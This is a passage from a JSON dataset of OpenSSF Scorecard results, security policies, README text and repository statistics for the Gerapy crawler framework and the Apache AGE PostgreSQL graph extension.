                        "Warn: Project is vulnerable to: GHSA-9wx4-h78v-vm56",
                        "Warn: Project is vulnerable to: GHSA-23j4-mw76-5v7h",
                        "Warn: Project is vulnerable to: GHSA-4qqq-9vqf-3h3f",
                        "Warn: Project is vulnerable to: GHSA-7j7m-v7m3-jqm7",
                        "Warn: Project is vulnerable to: GHSA-cc65-xxvf-f7r9",
                        "Warn: Project is vulnerable to: GHSA-cw9j-q3vf-hrrv",
                        "Warn: Project is vulnerable to: GHSA-h7wm-ph43-c39p",
                        "Warn: Project is vulnerable to: GHSA-jm3v-qxmh-hxwv",
                        "Warn: Project is vulnerable to: GHSA-cx63-2mw6-8hw5",
                        "Warn: Project is vulnerable to: GHSA-2m57-hf25-phgg",
                        "Warn: Project is vulnerable to: GHSA-c8m8-j448-xjx7",
                        "Warn: Project is vulnerable to: GHSA-cf56-g6w6-pqq2 / PYSEC-2024-75",
                        "Warn: Project is vulnerable to: GHSA-vg46-2rrj-3647",
                        "Warn: Project is vulnerable to: GHSA-xc8x-vp79-p3wm / PYSEC-2023-224",
                        "Warn: Project is vulnerable to: GHSA-34jh-p97f-mpxf",
                        "Warn: Project is vulnerable to: GHSA-jfmj-5v4g-7637"
                    ],
                    "score": 0,
                    "reason": "66 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/gerapy/gerapy/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\nUse this section to tell people about which versions of your project are\ncurrently being supported with security updates.\n\n| Version | Supported          |\n| ------- | ------------------ |\n| 0.9.8   | Fixed issue of remote executing, https://github.com/Gerapy/Gerapy/issues/219 |\n\n## Reporting a Vulnerability\n\nPlease open an issue or send mail to `cqc@cuiqingcai.com`, thanks.\n",
        "project_all_labels": [
            "bug",
            "dependencies",
            "duplicate",
            "enhancement",
            "help wanted",
            "invalid",
            "javascript",
            "python",
            "question",
            "to develop",
            "to test",
            "wontfix"
        ],
        "README_content": "# Gerapy\n\n![Build](https://github.com/Gerapy/Gerapy/workflows/build/badge.svg)\n![Read the Docs](https://img.shields.io/readthedocs/gerapy)\n![PyPI - Python Version](https://img.shields.io/badge/python-3.6%2B-blue)\n[![GitHub stars](https://img.shields.io/github/stars/Gerapy/Gerapy)](https://github.com/Gerapy/Gerapy/stargazers)\n![PyPI - Downloads](https://img.shields.io/pypi/dm/gerapy)\n![Docker Pulls](https://img.shields.io/docker/pulls/germey/gerapy)\n![PyPI - License](https://img.shields.io/pypi/l/gerapy)\n\nDistributed Crawler Management Framework Based on Scrapy, Scrapyd, Scrapyd-Client, Scrapyd-API, Django and Vue.js.\n\n## Documentation\n\nDocumentation is available online at [https://docs.gerapy.com/](https://docs.gerapy.com/) and [https://github.com/Gerapy/Docs](https://github.com/Gerapy/Docs).\n\n## Support\n\nGerapy is developed based on Python 3.x. Python 2.x may be supported later.\n\n## Usage\n\nInstall Gerapy by pip:\n\n```bash\npip3 install gerapy\n```\n\nAfter the installation, you need to do these things below to run Gerapy server:\n\nIf you have installed Gerapy successfully, you can use command `gerapy`. If not, check the installation.\n\nFirst use this command to initialize the workspace:\n\n```bash\ngerapy init\n```\n\nNow you will get a folder named `gerapy`. Also you can specify the name of your workspace by this command:\n\n```\ngerapy init <workspace>\n```\n\nThen `cd` to this folder, and run this command to initialize the Database:\n\n```bash\ncd gerapy\ngerapy migrate\n```\n\nNext you need to create a superuser by this command:\n\n```\ngerapy createsuperuser\n```\n\nThen you can runserver by this command:\n\n```bash\ngerapy runserver\n```\n\nThen you can visit [http://localhost:8000](http://localhost:8000) to enjoy it. Also you can vist [http://localhost:8000/admin](http://localhost:8000/admin) to get the admin management backend.\n\nIf you want to run Gerapy in public, just run like this:\n\n```\ngerapy runserver 0.0.0.0:8000\n```\n\nThen it will run with public host and port 8000.\n\nIn Gerapy, You can create a configurable project and then configure and generate code of Scrapy automatically. But this module is unstable, we're trying to refine it.\n\nAlso you can drag your Scrapy Project to `projects` folder. Then refresh web, it will appear in the Project Index Page and comes to un-configurable, but you can edit this project through the web page.\n\nAs for deployment, you can move to Deploy Page. Firstly you need to build your project and add client in the Client Index Page, then you can deploy the project just by clicking button.\n\nAfter the deployment, you can manage the job in Monitor Page.\n\n## Docker\n\nJust run this command:\n\n```\ndocker-compose up\n```\n\nThen it will run at port 8000. You can use the temp admin account (username: admin, password: admin) to login. And please change the password later for safety.\n\nCommand Usage:\n\n```\ndocker run -d -v <workspace>:/home/gerapy -p <public_port>:<container_port> germey/gerapy\n```\n\nPlease specify your workspace to mount Gerapy workspace by `-v <workspace>:/app/gerapy` and specify server port by `-p <public_port>:<container_port>`.\n\nIf you run Gerapy by Docker, you can visit Gerapy website such as [http://localhost:8000](http://localhost:8000) and enjoy it, no need to do other initialzation things.\n\n## TodoList\n\n- [x] Add Visual Configuration of Spider with Previewing Website\n- [x] Add Scrapyd Auth Management\n- [x] Add Gerapy Auth Management\n- [x] Add Timed Task Scheduler\n- [ ] Add Visual Configuration of Scrapy\n- [ ] Add Intelligent Analysis of Web Page\n\n## Communication\n\nIf you have any questions or ideas, you can send [Issues](https://github.com/Gerapy/Gerapy/issues) or [Pull Requests](https://github.com/Gerapy/Gerapy/pulls), your suggestions are really import for us, thanks for your contirbution.\n",
        "num_commits": 631,
        "project_age_days": 2678,
        "project_created_at": "2017-06-30",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-29",
        "num_contributors": 10,
        "num_pull": 100,
        "num_issues": 314,
        "num_opening_issue": 71,
        "project_size(kB)": 38367,
        "num_stargazers": 3345,
        "num_watchers": 3345,
        "num_forks": 643,
        "num_subscribers": 125,
        "SecurityPolicy_created_at": "2021-12-26 10:58:35",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "3f9a4904ed08f55ae892ea8aaed3a5fea0fd58d4",
                "url": "https://github.com/Gerapy/Gerapy/commit/3f9a4904ed08f55ae892ea8aaed3a5fea0fd58d4",
                "date": "2021-12-26 10:58:35"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email_issue",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "apache/age",
        "project_url": "https://github.com/apache/age",
        "SSF": {
            "date": "2024-10-29T20:57:40+07:00",
            "repo": {
                "name": "github.com/apache/age",
                "commit": "c75d9e477e2f83016a7a144291d2c15038cf229f"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.0,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'release/PG14/1.5.0'",
                        "Warn: branch protection not enabled for branch 'release/PG13/1.5.0'",
                        "Warn: branch protection not enabled for branch 'release/PG12/1.5.0'",
                        "Warn: branch protection not enabled for branch 'release/PG11/1.5.0'",
                        "Warn: branch protection not enabled for branch 'release/PG15/1.5.0'",
                        "Warn: branch protection not enabled for branch 'release/PG16/1.5.0'",
                        "Warn: branch protection not enabled for branch 'release/PG15/1.4.0'",
                        "Warn: branch protection not enabled for branch 'release/PG14/1.4.0'",
                        "Warn: branch protection not enabled for branch 'release/PG13/1.4.0'",
                        "Warn: branch protection not enabled for branch 'release/PG12/1.4.0'",
                        "Warn: branch protection not enabled for branch 'release/PG11/1.4.0'",
                        "Warn: branch protection not enabled for branch 'release/PG11/1.3.0'",
                        "Warn: branch protection not enabled for branch 'release/PG12/1.3.0'",
                        "Warn: branch protection not enabled for branch 'release/PG13/1.3.0'",
                        "Warn: branch protection not enabled for branch 'release/PG12/1.1.1'",
                        "Warn: branch protection not enabled for branch 'release/PG11/1.2.0'",
                        "Warn: branch protection not enabled for branch 'release/PG12/1.1.0'",
                        "Warn: branch protection not enabled for branch 'release/1.1.0'",
                        "Warn: branch protection not enabled for branch 'release/1.0.0'",
                        "Warn: branch protection not enabled for branch 'release/0.6.0'",
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Info: required approving review count is 2 on branch 'master'",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Warn: no status checks found to merge onto branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 out of 30 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "all changesets reviewed",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: SuperBois contributor org/company found, Asteramind contributor org/company found, bitnine contributor org/company found, agedb contributor org/company found, ewostech contributor org/company found, naver contributor org/company found, bitnine global contributor org/company found, apache contributor org/company found, o2o contributor org/company found, cmc global contributor org/company found, sktelecom contributor org/company found, BitnineGlobal contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 12 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: :0"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "15 commit(s) and 4 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/go-driver.yml:22: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/age/go-driver.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/go-driver.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/age/go-driver.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/installcheck.yaml:19: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/age/installcheck.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/installcheck.yaml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/age/installcheck.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/jdbc-driver.yaml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/age/jdbc-driver.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/jdbc-driver.yaml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/age/jdbc-driver.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/labeler.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/age/labeler.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/labeler.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/age/labeler.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/nodejs-driver.yaml:19: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/age/nodejs-driver.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/nodejs-driver.yaml:25: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/age/nodejs-driver.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python-driver.yaml:19: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/age/python-driver.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python-driver.yaml:25: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/age/python-driver.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/stale.yaml:10: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/age/stale.yaml/master?enable=pin",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile:20",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile:37: pin your Docker image by updating postgres:16 to postgres:16@sha256:91f464e7ba0ad91a106c94cff079fb4384139291b8c0502fd36989cf2c788bbb",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.dev:20: pin your Docker image by updating postgres:16 to postgres:16@sha256:91f464e7ba0ad91a106c94cff079fb4384139291b8c0502fd36989cf2c788bbb",
                        "Warn: npmCommand not pinned by hash: .github/workflows/nodejs-driver.yaml:31",
                        "Warn: pipCommand not pinned by hash: .github/workflows/python-driver.yaml:32",
                        "Info:   0 out of  13 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   3 containerImage dependencies pinned",
                        "Info:   1 out of   1 goCommand dependencies pinned",
                        "Info:   0 out of   1 npmCommand dependencies pinned",
                        "Info:   0 out of   1 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/apache/.github/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/apache/.github/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/apache/.github/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/apache/.github/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact PG14/v1.5.0-rc0 not signed: https://api.github.com/repos/apache/age/releases/136532607",
                        "Warn: release artifact PG13/v1.5.0-rc0 not signed: https://api.github.com/repos/apache/age/releases/136547864",
                        "Warn: release artifact PG12/v1.5.0-rc0 not signed: https://api.github.com/repos/apache/age/releases/136555687",
                        "Warn: release artifact PG11/v1.5.0-rc0 not signed: https://api.github.com/repos/apache/age/releases/136579067",
                        "Warn: release artifact PG15/v1.5.0-rc0 not signed: https://api.github.com/repos/apache/age/releases/136406973",
                        "Warn: release artifact PG14/v1.5.0-rc0 does not have provenance: https://api.github.com/repos/apache/age/releases/136532607",
                        "Warn: release artifact PG13/v1.5.0-rc0 does not have provenance: https://api.github.com/repos/apache/age/releases/136547864",
                        "Warn: release artifact PG12/v1.5.0-rc0 does not have provenance: https://api.github.com/repos/apache/age/releases/136555687",
                        "Warn: release artifact PG11/v1.5.0-rc0 does not have provenance: https://api.github.com/repos/apache/age/releases/136579067",
                        "Warn: release artifact PG15/v1.5.0-rc0 does not have provenance: https://api.github.com/repos/apache/age/releases/136406973"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/labeler.yml:8",
                        "Warn: no topLevel permission defined: .github/workflows/go-driver.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/installcheck.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/jdbc-driver.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/labeler.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/nodejs-driver.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/python-driver.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/stale.yaml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/apache/.github/contents/.github/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\nThis is a project of the [Apache Software Foundation](https://apache.org) and follows the ASF [vulnerability handling process](https://apache.org/security/#vulnerability-handling).\n\n## Reporting a Vulnerability\n\nTo report a new vulnerability you have discovered please follow the [ASF vulnerability reporting process](https://apache.org/security/#reporting-a-vulnerability).\n",
        "project_all_labels": [
            "0.2.0",
            "0.3.0",
            "0.4.0",
            "0.5.0",
            "0.6.0",
            "0.7.0",
            "1.0.0",
            "1.1.0",
            "algorithm",
            "API",
            "bolt protocol",
            "branching",
            "browser",
            "bug",
            "c",
            "CentOS",
            "coding standards",
            "conversion",
            "create",
            "critical bug",
            "cypher",
            "Debian",
            "debugging",
            "delete",
            "dependencies",
            "detection",
            "directed network",
            "distributed",
            "docker",
            "documentation",
            "driver",
            "duplicate",
            "enhancement",
            "ETL",
            "extension",
            "feature request",
            "fixed",
            "fortran",
            "GDBMS",
            "golang",
            "good first issue",
            "graph",
            "graph analysis",
            "graph visualization",
            "graphql",
            "help wanted",
            "high availability",
            "hooks",
            "hybrid queries",
            "invalid",
            "java",
            "label inheritance",
            "licensing",
            "linux",
            "load balancing",
            "macos",
            "mariadb",
            "master",
            "match",
            "merge",
            "migration",
            "monitoring",
            "mysql",
            "nodejs",
            "not critical bug",
            "Onboarding",
            "opencypher",
            "optimizer",
            "override-stale",
            "packaging",
            "parser",
            "performance",
            "PG11",
            "PG12",
            "PG13",
            "PG14",
            "PG15",
            "PG16",
            "plugin",
            "postgreSQL",
            "priority",
            "python",
            "query",
            "question",
            "release",
            "remove",
            "replication",
            "RHEL-8",
            "RHEL-9",
            "RPM",
            "security",
            "set",
            "sharding",
            "sql",
            "Stale",
            "swift",
            "testing",
            "To be Closed",
            "tool",
            "Ubuntu",
            "update",
            "upgrade",
            "viewer",
            "vle",
            "windows",
            "wontfix"
        ],
        "README_content": "<br>\n\n<p align=\"center\">\n     <img src=\"https://age.apache.org/age-manual/master/_static/logo.png\" width=\"30%\" height=\"30%\">\n</p>\n<br>\n\n<h3 align=\"center\">\n    <a href=\"https://age.apache.org/age-manual/master/_static/logo.png\" target=\"_blank\">\n        <img src=\"https://age.apache.org/age-manual/master/_static/logo.png\" height=\"25\" height=\"30% alt=\"Apache AGE style=\"margin: 0 0 -3px 0\">\n    </a>\n    <a href=\"https://age.apache.org/age-manual/master/_static/logo.png\" target=\"_blank\">\n    </a>\n     is a leading multi-model graph database </h3>\n     \n</h3>\n\n<h3 align=\"center\">Graph Processing & Analytics for Relational Databases</h3>\n\n<br>\n\n\n</br>\n\n\n\n<p align=\"center\">                                                                                                    \n  <a href=\"https://github.com/apache/age/blob/master/LICENSE\">\n    <img src=\"https://img.shields.io/github/license/apache/age\"/>\n  </a>\n  &nbsp;\n  <a href=\"https://github.com/apache/age/releases\">\n    <img src=\"https://img.shields.io/badge/Release-v1.5.0-FFA500?labelColor=gray&style=flat&link=https://github.com/apache/age/releases\"/>\n  </a>\n  &nbsp;\n  <a href=\"https://www.postgresql.org/docs/16/index.html\">\n    <img src=\"https://img.shields.io/badge/Version-Postgresql 16-00008B?labelColor=gray&style=flat&link=https://www.postgresql.org/docs/16/index.html\"/>\n  </a>\n  &nbsp;\n  <a href=\"https://github.com/apache/age/issues\">\n    <img src=\"https://img.shields.io/github/issues/apache/age\"/>\n  </a>\n  &nbsp;\n  <a href=\"https://github.com/apache/age/network/members\">\n    <img src=\"https://img.shields.io/github/forks/apache/age\"/>\n  </a>\n  &nbsp;\n  <a href=\"https://github.com/apache/age/stargazers\">\n    <img src=\"https://img.shields.io/github/stars/apache/age\"/>\n  </a>\n\n</p>\n\n<br>\n\n\n<h2><img height=\"30\" src=\"/img/AGE.png\">&nbsp;&nbsp;What is Apache AGE?</h2>\n\n[Apache AGE](https://age.apache.org/#) is an extension for PostgreSQL that enables users to leverage a graph database on top of the existing relational databases. AGE is an acronym for A Graph Extension and is inspired by Bitnine's AgensGraph, a multi-model database fork of PostgreSQL. The basic principle of the project is to create a single storage that handles both the relational and graph data model so that the users can use the standard ANSI SQL along with openCypher, one of the most popular graph query languages today. There is a strong need for cohesive, easy-to-implement multi-model databases. As an extension of PostgreSQL, AGE supports all the functionalities and features of PostgreSQL while also offering a graph model to boot.\n</br>\n</br>\n</br>\n\n<p align=\"center\">\n<img src=\"/img/age-01.png\" width=\"80%\" height=\"80%\">\n</p>\n\n</br>\n\n\n<h2><img height=\"30\" src=\"/img/tick.svg\">&nbsp;&nbsp;Overview</h2>\n\nApache AGE is :\n\n- **Powerful**: adds graph database support to the already popular PostgreSQL database: PostgreSQL is used by organizations including Apple, Spotify, and NASA.\n- **Flexible**: allows you to perform openCypher queries, which makes complex queries much easier to write. It also enables querying multiple graphs at the same time.\n- **Intelligent**: allows you to perform graph queries that are the basis for many next-level web services such as fraud detection, master data management, product recommendations, identity and relationship management, experience personalization, knowledge management, and more.\n\n<h2><img height=\"30\" src=\"/img/features.svg\">&nbsp;&nbsp;Features</h2>\n</br>\n</br>\n\n<p align=\"center\">\n<img src=\"/img/age-03.png\" width=\"80%\" height=\"80%\">\n</p>\n</br>\n\n- **Cypher Query**: supports graph query language\n- **Hybrid Querying**: enables SQL and/or Cypher\n- **Querying**: enables multiple graphs\n- **Hierarchical**: graph label organization\n- **Property Indexes**: on both vertices(nodes) and edges\n- **Full PostgreSQL**: supports PG features\n\n\n\n<h2><img height=\"30\" src=\"/img/documentation.svg\">&nbsp;&nbsp;Documentation</h2>\n\nRefer to our latest [Apache AGE documentation](https://age.apache.org/age-manual/master/index.html) to learn about installation, features, built-in functions, and  Cypher queries.\n\n\n\n<h2><img height=\"30\" src=\"/img/installation.svg\">&nbsp;&nbsp;Pre-Installation</h2>\n\nInstall the following essential libraries according to each OS. Building AGE from the source depends on the following Linux libraries (Ubuntu package names shown below):\n\n- **CentOS**\n```bash\nyum install gcc glibc glib-common readline readline-devel zlib zlib-devel flex bison\n```\n- **Fedora**\n```bash\ndnf install gcc glibc bison flex readline readline-devel zlib zlib-devel\n```\n- **Ubuntu**\n```bash\nsudo apt-get install build-essential libreadline-dev zlib1g-dev flex bison\n```\n\n<h2><img height=\"30\" src=\"/img/installation.svg\">&nbsp;&nbsp;Installation</h2>\n\nApache AGE is intended to be simple to install and run. It can be installed with Docker and other traditional ways. \n\n<h4><a><img width=\"20\" src=\"/img/pg.svg\"></a>\n&nbsp;Install PostgreSQL\n</h4>\n\nYou will need to install an AGE compatible version of Postgres<a>, for now AGE supports Postgres 11, 12, 13, 14, 15 & 16. Supporting the latest versions is on AGE roadmap.\n\n<h4>\n&nbsp;Installation via Package Manager\n</h4>\n\nYou can use a <a href=\"https://www.postgresql.org/download/\">package management </a> that your OS provides to download PostgreSQL.\n\n<br>\n\n```bash\nsudo apt install postgresql\n\n```\n<h4>\n&nbsp;Installation From Source Code\n</h4>\n\nYou can <a href=\"https://www.postgresql.org/ftp/source/\"> download the Postgres </a> source code and install your own instance of Postgres. You can read instructions on how to install from source code for different versions on the <a href=\"https://www.postgresql.org/docs/16/installation.html\">official Postgres Website.</a>\n\n\n\n<h4><img width=\"20\" src=\"/img/tux.svg\"><img width=\"20\" src=\"/img/apple.svg\"> &nbsp;Install AGE on Linux and MacOS\n</h4>\n\nClone the <a href=\"https://github.com/apache/age\">github repository</a> or download the <a href=\"https://github.com/apache/age/releases\">download an official release.\n</a>\nRun the pg_config utility and check the version of PostgreSQL. Currently, only PostgreSQL versions 11, 12, 13, 14, 15 & 16 are supported. If you have any other version of Postgres, you will need to install PostgreSQL version 11, 12, 13, 14, 15, or 16.\n<br>\n    \n```bash\npg_config\n```\nRun the following command in the source code directory of Apache AGE to build and install the extension.  \n     \n```bash\nmake install\n```\n     \nIf the path to your Postgres installation is not in the PATH variable, add the path in the arguments:\n```bash\nmake PG_CONFIG=/path/to/postgres/bin/pg_config install\n```\n\n\n<h4></a><img width=\"30\" src=\"/img/docker.svg\"></a>\n&nbsp;Run using Docker\n</h4>\n\n<h5> Get the docker image </h5>\n\n```bash\ndocker pull apache/age\n\n```\n<h5> Create AGE docker container </h5>\n\n```bash\ndocker run \\\n    --name age  \\\n    -p 5455:5432 \\\n    -e POSTGRES_USER=postgresUser \\\n    -e POSTGRES_PASSWORD=postgresPW \\\n    -e POSTGRES_DB=postgresDB \\\n    -d \\\n    apache/age\n```\n\n<h5> Enter PostgreSQL's psql: </h5>\n\n```bash\ndocker exec -it age psql -d postgresDB -U postgresUser\n```\n\n\n\n<h2><img height=\"20\" src=\"/img/contents.svg\">&nbsp;&nbsp;Post Installation</h2>\n\nFor every connection of AGE you start, you will need to load the AGE 